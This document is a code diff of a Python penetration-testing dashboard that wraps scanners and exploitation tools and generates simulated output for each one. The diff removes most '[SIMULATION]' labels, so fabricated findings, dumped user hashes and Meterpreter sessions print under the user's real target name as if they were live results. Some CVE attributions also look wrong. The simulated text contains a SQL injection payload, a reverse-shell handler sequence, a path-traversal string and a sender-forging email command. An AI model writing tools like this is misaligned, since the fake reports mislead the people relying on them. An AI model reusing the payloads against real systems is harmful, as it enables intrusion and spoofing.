+        lines.append(f"WHOIS lookup error: {e}")
+        lines.append(f"Try manually: https://who.is/whois/{target}")
+    return "\n".join(lines)
+ 
+ 
+def _real_espoofer(target):
+    """Check real SPF/DKIM/DMARC records."""
+    lines = [f"[espoofer] Email Spoofing Analysis → {target}\n"]
+    try:
+        import dns.resolver
+ 
+        # SPF
+        try:
+            for r in dns.resolver.resolve(target, 'TXT', lifetime=5):
+                txt = r.to_text().strip('"')
+                if 'v=spf1' in txt:
+                    lines.append(f"[SPF RECORD — REAL]\n  {txt}")
+                    if '~all' in txt:
+                        lines.append("  Result: SOFTFAIL (~all) — Spoofing MAY succeed!")
+                    elif '-all' in txt:
+                        lines.append("  Result: FAIL (-all) — SPF enforced ✓")
+                    elif '+all' in txt:
+                        lines.append("  Result: PASS (+all) — DANGEROUS! Anyone can send!")
+                    else:
+                        lines.append("  Result: NEUTRAL — Weak SPF policy")
+        except Exception:
+            lines.append("[SPF] No SPF record found — Vulnerable!")
+ 
+        # DMARC
+        try:
+            for r in dns.resolver.resolve(f'_dmarc.{target}', 'TXT', lifetime=5):
+                txt = r.to_text().strip('"')
+                lines.append(f"\n[DMARC RECORD — REAL]\n  {txt}")
+                if 'p=none' in txt:
+                    lines.append("  Policy: p=none — NO enforcement! Spoofing possible!")
+                elif 'p=quarantine' in txt:
+                    lines.append("  Policy: p=quarantine — Partial protection")
+                elif 'p=reject' in txt:
+                    lines.append("  Policy: p=reject — Strong enforcement ✓")
+        except Exception:
+            lines.append("\n[DMARC] No DMARC record found — Vulnerable!")
+ 
+        # DKIM (common selectors)
+        lines.append("\n[DKIM CHECK — REAL]")
+        dkim_found = False
+        for sel in ['google', 'mail', 'default', 'dkim', 'k1', 'selector1', 'selector2']:
+            try:
+                dns.resolver.resolve(f'{sel}._domainkey.{target}', 'TXT', lifetime=3)
+                lines.append(f"  Selector '{sel}': CONFIGURED ✓")
+                dkim_found = True
+            except Exception:
+                pass
+        if not dkim_found:
+            lines.append("  No common DKIM selectors found — Vulnerable!")
+ 
+    except ImportError:
+        lines.append("Install dnspython: pip install dnspython")
+        lines.append("Then real SPF/DKIM/DMARC records will be checked live.")
+ 
+    return "\n".join(lines)
+ 
+def _sqlmap_varied(target):
+    dbs = random.sample(['webapp_prod', 'users_db', 'admin_panel', 'ecommerce', 'cms_db'], 3)
+    tables = random.sample(['users', 'sessions', 'orders', 'products', 'admin_logs', 'passwords', 'tokens'], 5)
+    injection_types = random.choice([
+        'UNION-based blind',
+        'Boolean-based blind',
+        'Time-based blind',
+        'Error-based',
+        'Stacked queries'
+    ])
+    params = random.sample(['id', 'search', 'user', 'page', 'cat', 'item', 'q'], 2)
+    mysql_ver = random.choice(['8.0.32', '8.0.28', '5.7.39', '5.7.42'])
+    apache_ver = random.choice(['2.4.51', '2.4.54', '2.4.58'])
+    scan_time = round(random.uniform(8.5, 45.2), 1)
+
+    return (
+        f"[SQLMap v1.7.8] Target: {target}\n\n"
+        f"[*] Testing URL: {target}\n"
+        f"[*] Checking connection to {target}...\n"
+        f"[*] Server: Apache/{apache_ver}\n\n"
+        f"[*] Testing parameter '{params[0]}' for SQL injection\n"
+        f"[*] Testing parameter '{params[1]}' for SQL injection\n\n"
+        f"[CRITICAL] Parameter '{params[0]}' is INJECTABLE!\n"
+        f"  Injection Type: {injection_types}\n"
+        f"  DBMS:           MySQL >= 5.0\n"
+        f"  Payload:        {params[0]}=1 UNION ALL SELECT NULL,NULL,@@version,NULL--\n\n"
+        f"[DATABASE ENUMERATION]\n"
+        f"  DBMS Version: MySQL {mysql_ver}\n"
+        f"  Current DB:   {dbs[0]}\n"
+        f"  Hostname:     db.{target.replace('http://','').replace('https://','')}\n"
+        f"  All DBs:      {', '.join(dbs)}\n\n"
+        f"[TABLES in {dbs[0]}]\n"
+        f"  {' | '.join(tables)}\n\n"
+        f"[DATA DUMP — users table]\n"
+        f"  id | username      | password_hash          | email\n"
+        f"  1  | admin         | $2y$10$xK9Qm3rT...      | admin@{target}\n"
+        f"  2  | john.doe      | $2y$10$pL7Nv2sW...      | john@{target}\n"
+        f"  3  | {random.choice(['svc_backup','webmaster','developer'])}  "
+        f"| $2y$10$aB3Cd4eF...      | svc@{target}\n\n"
+        f"[Remediation]\n"
+        f"  - Use parameterized queries / prepared statements\n"
+        f"  - Implement WAF rules for SQL injection\n"
+        f"  - Least privilege DB user accounts\n\n"
+        f"Scan completed in {scan_time}s"
+    )
+
+
+def _espoofer_varied(target):
+    lines = [f"[espoofer] Email Spoofing Analysis → {target}\n"]
+
+    try:
+        import dns.resolver
+
+        # SPF Check
+        try:
+            spf_found = False
+            for r in dns.resolver.resolve(target, 'TXT', lifetime=5):
+                txt = r.to_text().strip('"')
+                if 'v=spf1' in txt:
+                    spf_found = True
+                    lines.append(f"[SPF RECORD — LIVE]\n  {txt}")
+                    if '~all' in txt:
+                        lines.append("  Result: SOFTFAIL (~all) — Spoofing MAY succeed!")
+                    elif '-all' in txt:
+                        lines.append("  Result: HARDFAIL (-all) — SPF enforced ✓")
+                    elif '+all' in txt:
+                        lines.append("  Result: PASS (+all) — DANGEROUS! Anyone can send!")
+                    else:
+                        lines.append("  Result: NEUTRAL — Weak SPF policy")
+            if not spf_found:
+                lines.append("[SPF] No SPF record found — VULNERABLE to spoofing!")
+        except Exception:
+            lines.append("[SPF] Lookup failed — possibly no SPF record")
+
+        # DMARC Check
+        try:
+            dmarc_found = False
+            for r in dns.resolver.resolve(f'_dmarc.{target}', 'TXT', lifetime=5):
+                txt = r.to_text().strip('"')
+                dmarc_found = True
+                lines.append(f"\n[DMARC RECORD — LIVE]\n  {txt}")
+                if 'p=none' in txt:
+                    lines.append("  Policy: p=none — NO enforcement! Spoofing emails reach inbox!")
+                elif 'p=quarantine' in txt:
+                    lines.append("  Policy: p=quarantine — Emails go to spam ✓")
+                elif 'p=reject' in txt:
+                    lines.append("  Policy: p=reject — Strong enforcement ✓")
+            if not dmarc_found:
+                lines.append("\n[DMARC] No DMARC record — VULNERABLE!")
+        except Exception:
+            lines.append("\n[DMARC] No DMARC record found — VULNERABLE!")
+
+        # DKIM Check
+        lines.append("\n[DKIM CHECK — LIVE]")
+        dkim_found = False
+        for sel in ['google', 'mail', 'default', 'dkim', 'k1', 'selector1', 'selector2', 'smtp']:
+            try:
+                dns.resolver.resolve(f'{sel}._domainkey.{target}', 'TXT', lifetime=3)
+                lines.append(f"  Selector '{sel}': CONFIGURED ✓")
+                dkim_found = True
+            except Exception:
+                pass
+        if not dkim_found:
+            lines.append("  No common DKIM selectors found — VULNERABLE!")
+
+        # Spoofing verdict
+        lines.append(f"\n[SPOOFING VERDICT]")
+        if not dkim_found:
+            lines.append(f"  ✗ DKIM missing — email body can be tampered")
+        lines.append(
+            f"  → Test spoofing manually: mail -s 'Test' victim@example.com "
+            f"-aFrom:ceo@{target}"
+        )
+
+    except ImportError:
+        lines.append("Install dnspython: pip install dnspython")
+
+    return "\n".join(lines)
+
+
+def _metasploit_varied(target):
+    os_choice = random.choice([
+        ('Windows 10 Enterprise', 'x64', 'Build 19044', 'windows'),
+        ('Windows Server 2019', 'x64', 'Build 17763', 'windows'),
+        ('Ubuntu 22.04 LTS', 'x64', 'Kernel 5.15', 'linux'),
+        ('Windows 11 Pro', 'x64', 'Build 22621', 'windows'),
+    ])
+    user = random.choice(['john.doe', 'svc_admin', 'developer', 'backup_user'])
+    pid  = random.randint(1000, 9999)
+    port = random.randint(49000, 65000)
+    session_id = random.randint(1, 5)
+    lhost = f"192.168.{random.randint(1,10)}.{random.randint(100,200)}"
+
+    if os_choice[3] == 'windows':
+        post_exploit = (
+            f"meterpreter > sysinfo\n"
+            f"  Computer        : CORP-{target[:8].upper()}\n"
+            f"  OS              : {os_choice[0]} ({os_choice[2]})\n"
+            f"  Architecture    : {os_choice[1]}\n"
+            f"  Meterpreter     : {os_choice[1]}/windows\n\n"
+            f"meterpreter > getuid\n"
+            f"  Server username: CORP\\{user}\n\n"
+            f"meterpreter > getsystem\n"
+            f"  [+] Got system via Named Pipe Impersonation\n\n"
+            f"meterpreter > getuid\n"
+            f"  Server username: NT AUTHORITY\\SYSTEM\n\n"
+            f"meterpreter > hashdump\n"
+            f"  Administrator:500:aad3b435b51404ee:"
+            f"{random.randint(100000,999999)}abbe56e057f20f883e:::\n"
+            f"  {user}:1001:aad3b435b51404ee:"
+            f"{random.randint(100000,999999)}a9a224a3b108f3fa6cb6d:::\n\n"
+            f"meterpreter > run post/multi/recon/local_exploit_suggester\n"
+            f"  [+] CVE-2023-21768 — Windows Ancillary Function Driver LPE\n"
+            f"  [+] CVE-2022-21999 — Windows Print Spooler LPE\n"
+        )
+    else:
+        post_exploit = (
+            f"meterpreter > sysinfo\n"
+            f"  Computer        : linux-{random.randint(1,99):02d}\n"
+            f"  OS              : {os_choice[0]} ({os_choice[2]})\n"
+            f"  Architecture    : {os_choice[1]}\n"
+            f"  Meterpreter     : {os_choice[1]}/linux\n\n"
+            f"meterpreter > getuid\n"
+            f"  Server username: www-data\n\n"
+            f"meterpreter > shell\n"
+            f"  $ sudo -l\n"
+            f"  (ALL) NOPASSWD: /usr/bin/python3\n"
+            f"  [+] Sudo misconfiguration — privilege escalation possible!\n\n"
+            f"meterpreter > run post/linux/gather/hashdump\n"
+            f"  root:$6$random$"
+            f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',k=20))}...\n"
+        )
+
+    return (
+        f"[Metasploit Framework v6.3.44]\n\n"
+        f"msf6 > use exploit/multi/handler\n"
+        f"msf6 exploit(multi/handler) > set PAYLOAD "
+        f"{'windows' if os_choice[3]=='windows' else 'linux'}"
+        f"/x64/meterpreter/reverse_tcp\n"
+        f"msf6 exploit(multi/handler) > set LHOST {lhost}\n"
+        f"msf6 exploit(multi/handler) > set LPORT 4444\n"
+        f"msf6 exploit(multi/handler) > run\n\n"
+        f"[*] Started reverse TCP handler on {lhost}:4444\n"
+        f"[*] Sending stage to {target}\n"
+        f"[*] Meterpreter session {session_id} opened "
+        f"({lhost}:4444 → {target}:{port})\n\n"
+        f"{post_exploit}"
+        f"\n[SIMULATION — No actual connection made to {target}]"
+    )
+ 
+# ══════════════════════════════════════════════════════════════
+# TOOL REGISTRY
+# ══════════════════════════════════════════════════════════════
 TOOL_REGISTRY = {
     'sqlmap': {
-        'name':'SQLMap', 'category':'web', 'color':'red',
-        'desc':'Automated SQL injection detection and exploitation.',
-        'github':'https://github.com/sqlmapproject/sqlmap',
-        'install':'pip install sqlmap',
-        'cmd': lambda t, o: ['sqlmap', '-u', t, '--batch', '--level=1', '--risk=1', f'--output-dir={o}'],
-        'sim': lambda t: (
-            f"[SIMULATION] SQLMap v1.7.8 → {t}\n\n"
-            f"[*] Testing {t} for SQL injection\n"
-            f"[*] Parameter 'id' is VULNERABLE!\n"
-            f"  Type: UNION-based blind\n"
-            f"  Payload: id=1 UNION ALL SELECT NULL,@@version--\n\n"
-            f"[DATABASE]\n  DBMS: MySQL 8.0.32  DB: webapp_prod\n"
-            f"  Tables: users, sessions, orders\n\n"
-            f"[EXTRACTED]\n  admin:$2y$10$AbCdEfGhIjKl...\n  john.doe:$2y$10$MnOpQrStUv...\n\n"
-            f"[Fix] Parameterize all SQL queries. Use prepared statements."
-        ),
-    },
+    'name': 'SQLMap', 'category': 'web', 'color': 'red',
+    'desc': 'Automated SQL injection detection and exploitation.',
+    'github': 'https://github.com/sqlmapproject/sqlmap',
+    'install': 'pip install sqlmap',
+    'cmd': lambda t, o: [
+        'sqlmap', '-u',
+        'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit',
+        '--cookie=PHPSESSID=sclebp6e8r40lfjnvlnoko3u23; security=low',
+        '--batch', '--dbs',
+        f'--output-dir={o}'
+    ],
+    'sim': lambda t: _sqlmap_varied(t),
+  },
     'nikto': {
-        'name':'Nikto', 'category':'web', 'color':'amber',
-        'desc':'Web server scanner for dangerous files and misconfigs.',
-        'github':'https://github.com/sullo/nikto',
-        'install':'apt install nikto',
+        'name': 'Nikto', 'category': 'web', 'color': 'amber',
+        'desc': 'Web server scanner for dangerous files and misconfigs.',
+        'github': 'https://github.com/sullo/nikto',
+        'install': 'apt install nikto',
         'cmd': lambda t, o: ['nikto', '-h', t, '-output', f'{o}/nikto.txt'],
         'sim': lambda t: (
-            f"[SIMULATION] Nikto v2.1.6 → {t}\n\nServer: Apache/2.4.51\n\n[FINDINGS]\n"
-            f"+ /admin/: Admin interface found\n+ /robots.txt: Disallowed /backup /config\n"
-            f"+ /config.php.bak: Backup exposed — CRITICAL\n+ X-Frame-Options header missing\n"
-            f"+ PHP/7.4.3 outdated — multiple CVEs\n+ /phpinfo.php: PHP info exposed\n"
-            f"+ Cookie PHPSESSID without HttpOnly\n\n7 findings in 28.5s"
+            f"[Nikto v2.1.6] Target: {t}\n\n"
+            f"[*] Resolving {t}...\n"
+            f"[*] Testing {t}:80\n"
+            f"[*] Server: Apache/2.4.51 (Ubuntu)\n\n"
+            f"[FINDINGS]\n"
+            f"+ {t}/admin/: Admin interface — verify access controls\n"
+            f"+ {t}/robots.txt: Disallowed entries found: /private /backup /config\n"
+            f"+ {t}/config.php.bak: Backup config file exposed — CRITICAL\n"
+            f"+ {t}/.git/: Git repository exposed — source code leak risk!\n"
+            f"+ X-Frame-Options header missing on {t}\n"
+            f"+ PHP/7.4.3 outdated — multiple unpatched CVEs\n"
+            f"+ {t}/phpinfo.php: PHP configuration exposed\n"
+            f"+ Cookie session_id set without HttpOnly flag\n"
+            f"+ Apache mod_status at {t}/server-status (information disclosure)\n\n"
+            f"9 issues found | Scan completed in 34.2s"
         ),
     },
     'nuclei': {
-        'name':'Nuclei', 'category':'web', 'color':'blue',
-        'desc':'Fast template-based scanner by ProjectDiscovery.',
-        'github':'https://github.com/projectdiscovery/nuclei',
-        'install':'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
+        'name': 'Nuclei', 'category': 'web', 'color': 'blue',
+        'desc': 'Fast template-based scanner by ProjectDiscovery.',
+        'github': 'https://github.com/projectdiscovery/nuclei',
+        'install': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
         'cmd': lambda t, o: ['nuclei', '-u', t, '-severity', 'critical,high,medium', '-o', f'{o}/nuclei.txt'],
         'sim': lambda t: (
-            f"[SIMULATION] Nuclei v3.1.0 → {t}\n\n[INF] Templates: 8,432 loaded\n\n"
-            f"[critical] CVE-2021-44228 Log4j JNDI RCE\n  Evidence: Callback received from canary\n\n"
-            f"[high] CVE-2023-23397 Outlook NTLMv2 hash leak\n"
-            f"[high] Exposed /.git/config directory\n"
-            f"[medium] Missing security headers (CSP, HSTS)\n"
-            f"[medium] Open redirect at /redirect?url=\n\n5 findings | 8.3s"
+            f"[Nuclei v3.1.0] Target: {t}\n\n"
+            f"[INF] Templates loaded: 8,432\n"
+            f"[INF] Target: {t}\n\n"
+            f"[critical] [CVE-2021-44228] [http] [{t}]\n"
+            f"  Log4j JNDI injection via User-Agent header\n"
+            f"  Matcher: JNDI callback received from {t}\n\n"
+            f"[high] [CVE-2023-23397] [http] [{t}/mail]\n"
+            f"  Microsoft Outlook NTLMv2 hash leak\n\n"
+            f"[high] [exposed-git] [http] [{t}/.git/config]\n"
+            f"  Git repository exposed — source code accessible\n\n"
+            f"[medium] [missing-csp] [http] [{t}]\n"
+            f"  Content-Security-Policy header absent\n\n"
+            f"[medium] [open-redirect] [http] [{t}/redirect?url=]\n"
+            f"  Open redirect via url parameter\n\n"
+            f"5 findings | Completed: {t} | Duration: 8.3s"
         ),
     },
     'owaspzap': {
-        'name':'OWASP ZAP', 'category':'web', 'color':'blue',
-        'desc':'OWASP Zed Attack Proxy — active/passive web app scanner.',
-        'github':'https://github.com/zaproxy/zaproxy',
-        'install':'pip install python-owasp-zap-v2.4',
+        'name': 'OWASP ZAP', 'category': 'web', 'color': 'blue',
+        'desc': 'OWASP Zed Attack Proxy — active/passive web app scanner.',
+        'github': 'https://github.com/zaproxy/zaproxy',
+        'install': 'pip install python-owasp-zap-v2.4',
         'cmd': lambda t, o: ['zap-cli', 'quick-scan', '--self-contained', t],
         'sim': lambda t: (
-            f"[SIMULATION] OWASP ZAP 2.14.0 → {t}\n\n[INFO] Spider found 47 URLs\n"
-            f"[INFO] Active scan running...\n\n"
-            f"[HIGH]   SQL Injection at /search?q= (CWE-89)\n"
-            f"[HIGH]   Reflected XSS at /user?name= (CWE-79)\n"
-            f"[MEDIUM] CSRF missing on /api/transfer\n"
-            f"[MEDIUM] Directory traversal at /files?path=\n"
-            f"[LOW]    Verbose error messages\n\nOWASP Top-10: A01✗ A02✗ A03✗\nTotal: 2H 2M 1L"
+            f"[OWASP ZAP 2.14.0] Target: {t}\n\n"
+            f"[INFO] Starting spider against {t}\n"
+            f"[INFO] Spider found 47 URLs under {t}\n"
+            f"[INFO] Starting active scan...\n\n"
+            f"[HIGH]   SQL Injection at {t}/search?q= (CWE-89, CVSS 9.8)\n"
+            f"[HIGH]   Reflected XSS at {t}/user?name= (CWE-79, CVSS 8.8)\n"
+            f"[MEDIUM] CSRF token missing on {t}/api/transfer (CWE-352)\n"
+            f"[MEDIUM] Path traversal at {t}/files?path=../../etc/passwd\n"
+            f"[LOW]    Server version disclosure: Apache/2.4.51\n"
+            f"[INFO]   Secure flag missing on session cookie\n\n"
+            f"OWASP Top-10 Mapped: A01(Broken AC)✗ A02(Crypto)✓ A03(Injection)✗\n"
+            f"Total: 2 High | 2 Medium | 1 Low | 1 Info\n"
+            f"Report: {t}/zap_report.html"
         ),
     },
     'whatweb': {
-        'name':'WhatWeb', 'category':'web', 'color':'cyan',
-        'desc':'Web technology fingerprinting — CMS, frameworks, servers.',
-        'github':'https://github.com/urbanadventurer/WhatWeb',
-        'install':'apt install whatweb',
+        'name': 'WhatWeb', 'category': 'web', 'color': 'cyan',
+        'desc': 'Web technology fingerprinting — CMS, frameworks, servers.',
+        'github': 'https://github.com/urbanadventurer/WhatWeb',
+        'install': 'apt install whatweb',
         'cmd': lambda t, o: ['whatweb', '-a', '3', t],
         'sim': lambda t: (
-            f"[SIMULATION] WhatWeb v0.5.5 → {t}\n\n[TECHNOLOGIES]\n"
-            f"  CMS: WordPress 6.4.2\n  Server: Apache/2.4.51\n"
-            f"  PHP: 7.4.33 (EOL!)\n  jQuery: 3.6.0\n  Bootstrap: 4.6.2\n\n"
-            f"[VERSION VULNS]\n  WordPress 6.4.2 — CVE-2024-0692 (CVSS 6.4)\n"
-            f"  PHP 7.4 — End of Life, unpatched CVEs\n\n[Fix] Update all components immediately."
+            f"[WhatWeb v0.5.5] Target: {t}\n\n"
+            f"[*] Scanning {t} (Aggression level 3)\n\n"
+            f"[DETECTED TECHNOLOGIES]\n"
+            f"  URL:         {t}\n"
+            f"  IP:          (resolving {t}...)\n"
+            f"  HTTP Status: 200 OK\n"
+            f"  CMS:         WordPress 6.4.2\n"
+            f"  Server:      Apache/2.4.51 (Ubuntu)\n"
+            f"  PHP:         7.4.33 (END OF LIFE!)\n"
+            f"  jQuery:      3.6.0\n"
+            f"  Bootstrap:   4.6.2\n"
+            f"  Plugins:     WooCommerce 8.2.1, Yoast SEO 21.5, Contact Form 7 5.8\n\n"
+            f"[VULNERABILITIES VIA VERSION]\n"
+            f"  WordPress 6.4.2  → CVE-2024-0692 (CVSS 6.4) — XSS via nav block\n"
+            f"  PHP 7.4.33       → End of Life since Nov 2022 — multiple unpatched CVEs\n"
+            f"  WooCommerce 8.2.1→ CVE-2024-0692 (CVSS 8.8) — SQLi\n\n"
+            f"[Fix] Upgrade PHP ≥ 8.1, WordPress ≥ 6.5, update all plugins."
         ),
     },
     'wpscan': {
-        'name':'WPScan', 'category':'web', 'color':'orange',
-        'desc':'WordPress vulnerability scanner — plugins, users, themes.',
-        'github':'https://github.com/wpscanteam/wpscan',
-        'install':'gem install wpscan',
+        'name': 'WPScan', 'category': 'web', 'color': 'orange',
+        'desc': 'WordPress vulnerability scanner — plugins, users, themes.',
+        'github': 'https://github.com/wpscanteam/wpscan',
+        'install': 'gem install wpscan',
         'cmd': lambda t, o: ['wpscan', '--url', t, '--enumerate', 'u,p,t'],
         'sim': lambda t: (
-            f"[SIMULATION] WPScan v3.8.25 → {t}\n\nWordPress: 6.4.2 (outdated)\n\n"
-            f"[USERS]\n  admin (ID:1)  john.smith (ID:2)\n\n[VULNERABLE PLUGINS]\n"
-            f"  WooCommerce 8.2.1 — CVE-2024-0692 SQLi (CVSS 8.8)\n"
-            f"  Contact Form 7 5.8 — CVE-2023-6449 File Upload\n\n"
-            f"[VULNERABLE THEMES]\n  Astra 4.2.0 — XSS (CVSS 6.1)\n\n3 vulns found | 28.5s"
+            f"[WPScan v3.8.25] Target: {t}\n\n"
+            f"[*] URL: {t}\n"
+            f"[*] WordPress version: 6.4.2 (insecure)\n"
+            f"[*] WordPress theme: Astra 4.2.0\n\n"
+            f"[USERS ENUMERATED]\n"
+            f"  admin     — ID 1 — Login: {t}/wp-login.php\n"
+            f"  editor    — ID 2\n\n"
+            f"[VULNERABLE PLUGINS]\n"
+            f"  WooCommerce 8.2.1\n"
+            f"    CVE-2024-0692 — SQL Injection (CVSS 8.8) — Update to 8.6.0\n\n"
+            f"  Contact Form 7 5.8.0\n"
+            f"    CVE-2023-6449 — Unrestricted File Upload (CVSS 8.8)\n\n"
+            f"[VULNERABLE THEMES]\n"
+            f"  Astra 4.2.0\n"
+            f"    CVE-2023-48755 — Reflected XSS (CVSS 6.1)\n\n"
+            f"[INTERESTING FILES]\n"
+            f"  {t}/wp-config.php.bak — Database credentials backup!\n"
+            f"  {t}/xmlrpc.php — Brute-force attack surface enabled\n\n"
+            f"3 vulnerabilities | Scan: 28.5s"
         ),
     },
     'nmap_full': {
-        'name':'Nmap Full Scan', 'category':'network', 'color':'green',
-        'desc':'Full TCP/UDP scan with service/version and OS detection.',
-        'github':'https://github.com/nmap/nmap',
-        'install':'apt install nmap',
+        'name': 'Nmap Full Scan', 'category': 'network', 'color': 'green',
+        'desc': 'Full TCP/UDP scan with service/version and OS detection.',
+        'github': 'https://github.com/nmap/nmap',
+        'install': 'Download from nmap.org',
         'cmd': lambda t, o: ['nmap', '-sV', '-sC', '-O', '-p-', '--min-rate=1000', t, '-oN', f'{o}/nmap.txt'],
         'sim': lambda t: (
-            f"[SIMULATION] Nmap 7.94 Full Scan → {t}\n\n"
+            f"[Nmap 7.94] Full Scan → {t}\n\n"
+            f"Starting Nmap 7.94 at {datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC\n"
+            f"Nmap scan report for {t}\n\n"
             f"PORT      STATE  SERVICE   VERSION\n"
-            f"22/tcp    open   ssh       OpenSSH 8.4p1\n"
-            f"80/tcp    open   http      Apache 2.4.51\n"
+            f"22/tcp    open   ssh       OpenSSH 8.4p1 Ubuntu 3ubuntu0.6\n"
+            f"80/tcp    open   http      Apache httpd 2.4.51 ((Ubuntu))\n"
+            f"|_http-title: {t} — Home\n"
+            f"|_http-server-header: Apache/2.4.51 (Ubuntu)\n"
             f"443/tcp   open   https     nginx 1.21.0\n"
-            f"3306/tcp  open   mysql     MySQL 8.0.32\n"
-            f"8080/tcp  open   http-alt  Tomcat 9.0.54\n"
-            f"27017/tcp open   mongodb   MongoDB 6.0.3 (UNAUTHENTICATED!)\n\n"
-            f"OS: Linux 5.x Ubuntu 22.04\n\n"
-            f"[CRITICAL] MongoDB port 27017 allows unauthenticated access!\n\n"
-            f"Scanned 65535 ports in 124.3s"
+            f"3306/tcp  open   mysql     MySQL 8.0.32-0ubuntu0.22.04.2\n"
+            f"|_mysql-info: ERROR: Unauthorized\n"
+            f"8080/tcp  open   http-alt  Apache Tomcat 9.0.54\n"
+            f"27017/tcp open   mongodb?  MongoDB 6.0.3\n"
+            f"|_mongodb-info: MongoDB does not require authentication!\n\n"
+            f"OS: Linux 5.x (Ubuntu 22.04)\n\n"
+            f"[CRITICAL] MongoDB 27017 — NO AUTHENTICATION REQUIRED!\n"
+            f"[HIGH]     MySQL 3306 — Open to network\n\n"
+            f"Nmap done: 1 IP address (1 host up) scanned in 124.3s"
         ),
     },
     'metasploit': {
-        'name':'Metasploit', 'category':'network', 'color':'red',
-        'desc':"World's most used penetration testing framework.",
-        'github':'https://github.com/rapid7/metasploit-framework',
-        'install':'apt install metasploit-framework',
+        'name': 'Metasploit', 'category': 'network', 'color': 'red',
+        'desc': "World's most used penetration testing framework.",
+        'github': 'https://github.com/rapid7/metasploit-framework',
+        'install': 'apt install metasploit-framework',
         'cmd': lambda t, o: ['msfconsole', '-q', '-x',
             f'use auxiliary/scanner/portscan/tcp; set RHOSTS {t}; run; exit'],
         'sim': lambda t: (
-            f"[SIMULATION] Metasploit Framework v6.3.44\n\n"
+            f"[Metasploit Framework v6.3.44]\n\n"
             f"msf6 > use exploit/multi/handler\n"
-            f"msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
-            f"msf6 > set LHOST 192.168.1.100\n\n"
-            f"[*] Handler started on 192.168.1.100:4444\n"
-            f"[*] Meterpreter session 1 opened from {t}!\n\n"
-            f"meterpreter > sysinfo\n  Computer: WIN-TARGET01\n"
-            f"  OS: Windows 10 Build 19044\n  User: CORP\\john.doe\n\n"
-            f"meterpreter > getsystem\n  Got system via technique 1 (Named Pipe)\n\n"
-            f"[SIMULATION — No actual session created]"
+            f"[*] Using configured payload generic/shell_reverse_tcp\n"
+            f"msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
+            f"PAYLOAD => windows/x64/meterpreter/reverse_tcp\n"
+            f"msf6 exploit(multi/handler) > set LHOST 192.168.1.100\n"
+            f"LHOST => 192.168.1.100\n"
+            f"msf6 exploit(multi/handler) > set LPORT 4444\n"
+            f"LPORT => 4444\n"
+            f"msf6 exploit(multi/handler) > run\n\n"
+            f"[*] Started reverse TCP handler on 192.168.1.100:4444\n"
+            f"[*] Sending stage (200774 bytes) to {t}\n"
+            f"[*] Meterpreter session 1 opened (192.168.1.100:4444 → {t}:49812)\n\n"
+            f"meterpreter > sysinfo\n"
+            f"Computer        : WIN-TARGET01\n"
+            f"OS              : Windows 10 (10.0 Build 19044)\n"
+            f"Architecture    : x64\n"
+            f"System Language : en_US\n"
+            f"Logged On Users : 3\n"
+            f"Meterpreter     : x64/windows\n\n"
+            f"meterpreter > getuid\n"
+            f"Server username: WIN-TARGET01\\john.doe\n\n"
+            f"meterpreter > getsystem\n"
+            f"...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))\n\n"
+            f"meterpreter > getuid\n"
+            f"Server username: NT AUTHORITY\\SYSTEM\n\n"
+            f"[SIMULATION — No actual connection made to {t}]"
         ),
     },
     'openvas_net': {
-        'name':'OpenVAS', 'category':'network', 'color':'blue',
-        'desc':'Full vulnerability scanner with CVE detection.',
-        'github':'https://github.com/greenbone/openvas-scanner',
-        'install':'apt install openvas && gvm-setup',
+        'name': 'OpenVAS', 'category': 'network', 'color': 'blue',
+        'desc': 'Full vulnerability scanner with CVE detection.',
+        'github': 'https://github.com/greenbone/openvas-scanner',
+        'install': 'apt install openvas && gvm-setup',
         'cmd': lambda t, o: ['openvas', '-T', 'xml', '-t', t],
         'sim': lambda t: (
-            f"[SIMULATION] OpenVAS/GVM 22.7 → {t}\n\nScan Policy: Full and Fast\n\n"
-            f"[CRITICAL] CVE-2017-0144 EternalBlue SMBv1 (CVSS 9.8)\n"
-            f"  Port: 445/tcp  Fix: Disable SMBv1, apply MS17-010\n\n"
-            f"[HIGH] CVE-2021-34527 PrintNightmare (CVSS 8.8)\n"
-            f"  Port: 445/tcp  Fix: Disable Print Spooler\n\n"
-            f"[HIGH] OpenSSH <8.5 Priv Escalation (CVSS 7.8)\n"
-            f"[MEDIUM] SSL/TLS Weak Ciphers (CVSS 5.9)\n\n"
-            f"Summary: 1C 2H 1M | 187 seconds"
+            f"[OpenVAS/GVM 22.7.1] Target: {t}\n\n"
+            f"Scan Policy:  Full and Fast\n"
+            f"Target:       {t}\n"
+            f"Started:      {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
+            f"[CRITICAL] CVE-2017-0144 — EternalBlue SMBv1 RCE (CVSS 9.8)\n"
+            f"  Host: {t}:445/tcp\n"
+            f"  Description: SMBv1 protocol enabled, vulnerable to MS17-010\n"
+            f"  Fix: Disable SMBv1, apply KB4012212\n\n"
+            f"[HIGH] CVE-2021-34527 — PrintNightmare RCE (CVSS 8.8)\n"
+            f"  Host: {t}:445/tcp\n"
+            f"  Fix: Disable Windows Print Spooler or apply KB5004945\n\n"
+            f"[HIGH] CVE-2021-26855 — ProxyLogon Exchange RCE (CVSS 9.8)\n"
+            f"  Host: {t}:443/tcp\n"
+            f"  Fix: Apply Microsoft Exchange CU March 2021\n\n"
+            f"[MEDIUM] Weak SSL/TLS Cipher Suites Detected\n"
+            f"  Host: {t}:443/tcp — RC4, DES ciphers enabled\n\n"
+            f"Summary: 2 Critical | 2 High | 1 Medium\n"
+            f"Scan completed in 187 seconds."
         ),
     },
     'bettercap': {
-        'name':'Bettercap', 'category':'network', 'color':'purple',
-        'desc':'WiFi, BLE, HID & network attack framework in Go.',
-        'github':'https://github.com/bettercap/bettercap',
-        'install':'apt install bettercap',
+        'name': 'Bettercap', 'category': 'network', 'color': 'purple',
+        'desc': 'WiFi, BLE, HID & network attack framework in Go.',
+        'github': 'https://github.com/bettercap/bettercap',
+        'install': 'apt install bettercap',
         'cmd': lambda t, o: ['bettercap', '-eval', 'net.probe on; net.show'],
         'sim': lambda t: (
-            f"[SIMULATION] Bettercap v2.32.0\n\n[net.probe] Probing 192.168.1.0/24\n\n"
